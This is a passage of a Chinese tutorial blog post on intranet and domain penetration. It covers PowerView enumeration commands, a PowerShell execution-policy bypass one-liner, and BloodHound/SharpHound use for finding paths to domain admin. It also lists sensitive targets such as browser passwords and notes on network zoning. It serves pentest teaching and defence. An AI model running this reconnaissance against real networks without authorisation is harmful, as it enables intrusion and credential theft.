alt="图片"></p><p>如果想要修改权限就可以执行这条命令，然后选择Y：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy 权限名</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1696.png" alt="图片"></p><h3 id="powerview"><a href="#powerview" class="headerlink" title="powerview"></a>powerview</h3><p>powerview这个脚本是一款依赖于 powershell 和 WMI 对内网进行查询的常用渗透测试脚本。</p><p>下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>导入脚本 powerview.ps1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\powerview.ps1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1697.png" alt="图片"></p><h4 id="Powerview中常用的命令"><a href="#Powerview中常用的命令" class="headerlink" title="Powerview中常用的命令"></a>Powerview中常用的命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomain：获取当前用户所在的域名称。 </span><br><span class="line">Get-NetUser：返回所有用户的详细信息。 </span><br><span class="line">Get-NetDomainController：获取所有域控制器。 </span><br><span class="line">Get-NetComputer：获取所有域内机器的详细信息。 </span><br><span class="line">Get-NetOU：获取域中的 OU 信息。</span><br><span class="line">Get-NetGroup：获取所有域内组和组成员信息。 </span><br><span class="line">Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。 </span><br><span class="line">Get-NetShare：获取当前域内所有网络共享。 </span><br><span class="line">Get-NetSession：获取在指定服务器存在的会话信息。</span><br><span class="line">Get-NetRDPSession：获取在指定服务器存在的远程连接信息。</span><br><span class="line">Get-NetProcess：获取远程主机的进程信息。</span><br><span class="line">Get-UserEvent：获取指定用户的日志信息。 </span><br><span class="line">Get-ADObject：获取活动目录的对象信息。 </span><br><span class="line">Get-NetGPO：获取域所有组策略对象。 </span><br><span class="line">Get-DomainPolicy：获取域默认或域控制器策略。 </span><br><span class="line">Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限。 </span><br><span class="line">Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。</span><br><span class="line">Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器。 </span><br></pre></td></tr></table></figure><h4 id="获取当前用户所在的域名称"><a href="#获取当前用户所在的域名称" class="headerlink" title="获取当前用户所在的域名称"></a>获取当前用户所在的域名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1698.png" alt="图片"></p><h4 id="返回所有用户的详细信息"><a href="#返回所有用户的详细信息" class="headerlink" title="返回所有用户的详细信息"></a>返回所有用户的详细信息</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1699.png" alt="图片"></p><h4 id="获取所有域控制器"><a href="#获取所有域控制器" class="headerlink" title="获取所有域控制器"></a>获取所有域控制器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomainController</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1700.png" alt="图片"></p><h4 id="获取所有域内机器的详细信息"><a href="#获取所有域内机器的详细信息" class="headerlink" title="获取所有域内机器的详细信息"></a>获取所有域内机器的详细信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1701.png" alt="图片"></p><h4 id="获取域中的-OU-信息"><a href="#获取域中的-OU-信息" class="headerlink" title="获取域中的 OU 信息"></a>获取域中的 OU 信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetOU</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1702.png" alt="图片"></p><h4 id="获取所有域内组和组成员信息"><a href="#获取所有域内组和组成员信息" class="headerlink" title="获取所有域内组和组成员信息"></a>获取所有域内组和组成员信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGroup</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1703.png" alt="图片"></p><h4 id="根据-SPN-获取当前域使用的文件服务器"><a href="#根据-SPN-获取当前域使用的文件服务器" class="headerlink" title="根据 SPN 获取当前域使用的文件服务器"></a>根据 SPN 获取当前域使用的文件服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetFileServer</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1704.png" alt="图片"></p><h4 id="获取当前域内所有网络共享"><a href="#获取当前域内所有网络共享" class="headerlink" title="获取当前域内所有网络共享"></a>获取当前域内所有网络共享</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetShare</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1705.png" alt="图片"></p><h4 id="获取在指定服务器存在的会话信息"><a href="#获取在指定服务器存在的会话信息" class="headerlink" title="获取在指定服务器存在的会话信息"></a>获取在指定服务器存在的会话信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetSession</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1706.png" alt="图片"></p><h4 id="获取在指定服务器存在的远程连接信息"><a href="#获取在指定服务器存在的远程连接信息" class="headerlink" title="获取在指定服务器存在的远程连接信息"></a>获取在指定服务器存在的远程连接信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetRDPSession</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1707.png" alt="图片"></p><h4 id="获取远程主机的进程信息"><a href="#获取远程主机的进程信息" class="headerlink" title="获取远程主机的进程信息"></a>获取远程主机的进程信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetProcess</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1708.png" alt="图片"></p><h4 id="获取指定用户的日志信息"><a href="#获取指定用户的日志信息" class="headerlink" title="获取指定用户的日志信息"></a>获取指定用户的日志信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-UserEvent</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1709.png" alt="图片"></p><h4 id="获取活动目录的对象信息"><a href="#获取活动目录的对象信息" class="headerlink" title="获取活动目录的对象信息"></a>获取活动目录的对象信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1710.png" alt="图片"></p><h4 id="获取域所有组策略对象"><a href="#获取域所有组策略对象" class="headerlink" title="获取域所有组策略对象"></a>获取域所有组策略对象</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGPO</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1711.png" alt="图片"></p><h4 id="获取域默认或域控制器策略"><a href="#获取域默认或域控制器策略" class="headerlink" title="获取域默认或域控制器策略"></a>获取域默认或域控制器策略</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainPolicy</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1712.png" alt="图片"></p><h4 id="用于获取域用户登录计算机及该用户是否有本地管理权限"><a href="#用于获取域用户登录计算机及该用户是否有本地管理权限" class="headerlink" title="用于获取域用户登录计算机及该用户是否有本地管理权限"></a>用于获取域用户登录计算机及该用户是否有本地管理权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UserHunter</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1713.png" alt="图片"></p><h4 id="查找域内所有机器进程用于找到某特定用户"><a href="#查找域内所有机器进程用于找到某特定用户" class="headerlink" title="查找域内所有机器进程用于找到某特定用户"></a>查找域内所有机器进程用于找到某特定用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ProcessHunter</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1714.png" alt="图片"></p><h4 id="根据用户日志获取某域用户登录过哪些域机器"><a href="#根据用户日志获取某域用户登录过哪些域机器" class="headerlink" title="根据用户日志获取某域用户登录过哪些域机器"></a>根据用户日志获取某域用户登录过哪些域机器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UserEventHunter</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1715.png" alt="图片"></p><h3 id="CMD运行powershell"><a href="#CMD运行powershell" class="headerlink" title="CMD运行powershell"></a>CMD运行powershell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass &quot;import-module c:\powerview.ps1;get-netuser&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1716.png" alt="图片"></p><h2 id="2-14-域渗透分析工具bloodhound的使用"><a href="#2-14-域渗透分析工具bloodhound的使用" class="headerlink" title="2.14 域渗透分析工具bloodhound的使用"></a>2.14 域渗透分析工具bloodhound的使用</h2><p>安装BloodHound所需环境</p><h3 id="1、下载安装JDK"><a href="#1、下载安装JDK" class="headerlink" title="1、下载安装JDK"></a>1、下载安装JDK</h3><p>JDK8下载地址：<a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a></p><h3 id="2、下载安装Neo4j"><a href="#2、下载安装Neo4j" class="headerlink" title="2、下载安装Neo4j"></a>2、下载安装Neo4j</h3><p>下载地址：<a href="https://neo4j.com/download-center/#releases">https://neo4j.com/download-center/#releases</a></p><h3 id="3、启动Neo4j数据库服务端"><a href="#3、启动Neo4j数据库服务端" class="headerlink" title="3、启动Neo4j数据库服务端"></a>3、启动Neo4j数据库服务端</h3><p>下载好后，进入对应的目录在命令行运行如下命令启动（必须安装JDK环境才可以）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\neo4j-community-3.5.3\bin\</span><br><span class="line">neo4j.bat console</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1717.png" alt="图片"></p><p>通过浏览器打开：<a href="http://localhost:7474/">http://localhost:7474/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1718.png" alt="图片"></p><p>打开后设置一下密码：原密码neo4j，修改为：123456（任意）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1719.png" alt="图片"></p><h3 id="4、下载BloodHound"><a href="#4、下载BloodHound" class="headerlink" title="4、下载BloodHound"></a>4、下载BloodHound</h3><p>下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p><p>然后打开：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1720.png" alt="图片"></p><p>输入账号密码：eno4j、123456</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1721.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1722.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查找所有域管理员。 </span><br><span class="line">寻找到达域管理员的最短路径。 </span><br><span class="line">查找具有 dcsync权限的主体。 </span><br><span class="line">具有外部域组成员身份的用户。</span><br><span class="line">具有外部域组成员身份的组。 </span><br><span class="line">映射域信任。 </span><br><span class="line">无约束委托系统的最短路径。 </span><br><span class="line">从 KerberoAstable 用户获得的最短路径。</span><br><span class="line">从 KerberoAstable 用户到域管理员的最短路径。</span><br><span class="line">拥有主体的最短路径。 </span><br><span class="line">从所属主体到域管理员的最短路径。</span><br><span class="line">高价值目标的最短路径。 </span><br></pre></td></tr></table></figure><p>再下载：<a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe">https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe</a></p><p>放到C盘下：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1723.png" alt="图片"></p><p>然后运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1724.png" alt="图片"></p><p>运行完后会在当前路径下生成一个文件：20200323210837_BloodHound.zip</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1725.png" alt="图片"></p><p>然后我们吧他拖进去上传：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1726.png" alt="图片"></p><p>这个时候就有数据了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1727.png" alt="图片"></p><h3 id="查找所有域管理员"><a href="#查找所有域管理员" class="headerlink" title="查找所有域管理员"></a>查找所有域管理员</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1728.png" alt="图片"></p><h3 id="寻找最短到达域管理员的路径"><a href="#寻找最短到达域管理员的路径" class="headerlink" title="寻找最短到达域管理员的路径"></a>寻找最短到达域管理员的路径</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1729.png" alt="图片"></p><h3 id="查找具有-dcsync权限的主体"><a href="#查找具有-dcsync权限的主体" class="headerlink" title="查找具有 dcsync权限的主体"></a>查找具有 dcsync权限的主体</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1730.png" alt="图片"></p><h3 id="查看指定用户与域关联的详细信息"><a href="#查看指定用户与域关联的详细信息" class="headerlink" title="查看指定用户与域关联的详细信息"></a>查看指定用户与域关联的详细信息</h3><p>点一下用户就会在左边显示：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1731.png" alt="图片"></p><p>参考文章：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/sectool/179002.html</span><br><span class="line">https://www.cnblogs.com/KevinGeorge/p/10513211.html</span><br><span class="line">https://www.cnblogs.com/backlion/p/10643132.html</span><br></pre></td></tr></table></figure><h2 id="2-15-敏感数据防护"><a href="#2-15-敏感数据防护" class="headerlink" title="2.15 敏感数据防护"></a>2.15 敏感数据防护</h2><p>内网核心敏感数据，不仅仅包括数据库、电子邮件。还包括个人数据及组织的业务数据…可以说，价值高的数据基本上都在内网中，所以要了解攻击者的操作流程，这会对内网数据安全防护工作至关重要。</p><h3 id="1：资料、数据、文件的定位流程"><a href="#1：资料、数据、文件的定位流程" class="headerlink" title="1：资料、数据、文件的定位流程"></a>1：资料、数据、文件的定位流程</h3><p>内网数据防护的第一步，就是要熟悉攻击者获取数据的流程。在实际的网络环境中，攻击者主要通过各种恶意方法来定位公司内部各相关人员的机器。从而获取资料、数据、文件等重要信息。文件定位大致流程如下：</p><ul><li>定位内部人事组织结构</li><li>在内部人事组织结构中寻找需要监视的人员</li><li>定位相关人员的机器</li><li>监视相关人员存放文档的位置</li><li>列出存放文档的服务器的目录</li></ul><h3 id="2：重点核心业务机器及敏感信息防护"><a href="#2：重点核心业务机器及敏感信息防护" class="headerlink" title="2：重点核心业务机器及敏感信息防护"></a>2：重点核心业务机器及敏感信息防护</h3><p>重点核心业务机器是攻击者比较关心的机器，因此，我们需要对这些机器采取相应的安全防护措施。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1．核心业务机器</span><br><span class="line">高管/系统管理员/财务/人事/业务人员的个人计算机。 </span><br><span class="line">产品管理系统服务器（仓库管理系统） 。 </span><br><span class="line">OA 办公系统服务器。 </span><br><span class="line">财务应用系统服务器。 </span><br><span class="line">核心产品源码服务器（对于 IT公司，会架设自己的 SVN 或者 GIT 服务器） 。 </span><br><span class="line">数据库服务器。 </span><br><span class="line">文件服务器/共享服务器。</span><br><span class="line">邮件服务器。 </span><br><span class="line">网络监控系统服务器。 </span><br><span class="line">其他服务器（分公司、工厂）。 </span><br><span class="line"></span><br><span class="line">2．各类敏感文件信息 </span><br><span class="line">站点源码备份文件、数据库备份文件、配置文件备份等（后缀 XX.zip，XX.sql 等） 。 </span><br><span class="line">各类数据库的 Web 管理入口，如 phpmyadmin、adminer等。 </span><br><span class="line">浏览器密码和浏览器 cookie（IE、Chrome、Firefox） 。 </span><br><span class="line">其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。 </span><br><span class="line">Windows 无线密码。 </span><br><span class="line">目标内部的各种账号和密码信息，包括邮箱、VPN、FTP、TeamView 等。 </span><br></pre></td></tr></table></figure><h3 id="3：应用于文件形式信息的防护"><a href="#3：应用于文件形式信息的防护" class="headerlink" title="3：应用于文件形式信息的防护"></a>3：应用于文件形式信息的防护</h3><p>总体来说，渗透测试人员对于这一步的工作，一是要了解已攻陷机器所属人员的职位（通常 一个高职位的人在内网中的权限比一般员工要高，在他的计算机内也会有很多重要的、敏感的个 人或公司内部文件），二是要在该机器中通过一些搜索命令来寻找自己所需要的资料。用户在内网 中工作时，建议不要将一些特别重要的资料放在公开的计算机中，必要时一定要对 Office 文档进 行加密，密码也不要太过于简单（对低版本的 Office 软件，如 Office 2003，在网上很容易找到一些破解软件进行破解；对高版本的 Office 软件，也可以通过微软 Sysinternals Suite 套件中的抓取 Dump 的工具 procdump 来获取密码） 。</p><h2 id="2-16-分析域内网段划分情况及拓扑图结构"><a href="#2-16-分析域内网段划分情况及拓扑图结构" class="headerlink" title="2.16 分析域内网段划分情况及拓扑图结构"></a>2.16 分析域内网段划分情况及拓扑图结构</h2><p>要养成一个习惯，在掌握了内网相关信息后，可以做一个拓扑图来帮助我们分析内网网络的分布情况。</p><h3 id="1：基本架构"><a href="#1：基本架构" class="headerlink" title="1：基本架构"></a>1：基本架构</h3><p>我们还需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的Web服务器、后端脚本、数据库、系统平台等。</p><ul><li>ASP + Access + IIS 5.0/6.0 + Windows Sever 2003 </li><li>ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008 </li><li>PHP + MySQL + IIS  </li><li>PHP + MySQL + Apache  </li><li>PHP + MySQL + Ngnix </li><li>JSP + MySQL + Ngnix  </li><li>JSP + MSSQL + Tomcat </li><li>JSP + Oracle + Tomcat </li></ul><h3 id="2：域内网划分"><a href="#2：域内网划分" class="headerlink" title="2：域内网划分"></a>2：域内网划分</h3><p>内网的环境判断，首先需要分析内网 IP 地址的分布情况。一般可以通过内网中的路由器、交 换机等设备，以及 SNMP、弱口令等，来获取内网网络拓扑或 DNS 域传送的信息。一般的大公司 都会有内部网站，渗透测试人员也可通过内部网站的公开链接找出部门的 IP 地址段。 内部网络是怎么划分的？是按照部门划分网段，按照楼层划分网段，还是按照地区划分网段？ 内网通常可分为 DMZ 区、办公区和核心区（生产区） 。了解整个内网的网络分布和组成，也有助 于渗透测试人员了解内网的核心业务。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1732.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1．DMZ 区 </span><br><span class="line">在实际的渗透测试中，大多数情况下，在外围 Web 中拿到的权限在 DMZ 区。这个区域不属 于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理，DMZ 区会处在内网区能够访问 DMZ 区而 DMZ 区访问不了内网区的情况下，相关知识在第 1 章中已经详细讲解过，此处不再重 复。 </span><br><span class="line"></span><br><span class="line">2．办公区 </span><br><span class="line">办公区，顾名思义，是指公司员工日常的工作区。办公区的安全防护水平一般不是高，基本 防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中，攻击者在获取权限后，利用内网 信任关系，很容易扩大攻击面。一般情况下，攻击者很少会直接到达办公区。攻击者如果想进入 办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。 办公区按照系统可分为 OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒 系统、内部应用监控系统、运维管理系统等，按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等。 </span><br><span class="line"></span><br><span class="line">3．核心区 </span><br><span class="line">核心区一般存放企业最重要的数据、文档等信息资产，如域控制器、核心生产机器等，安全 设置也最为严格。根据目标开展的业务不同，相关服务器可能存在于不同的网段上。通过分析服 务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网 中横向移动时，会优先查找这些主机。 核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网络段可分为各不同的 业务网段、运维监控网段、安全管理网段等。 </span><br></pre></td></tr></table></figure><p>通过获取的目标主机及所在域的各类信息，就可以绘制内网的拓扑结构图，在后续的渗透测 试中，对照拓扑图可以更快地了解目标域网内部环境，准确定位内网具体目标。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
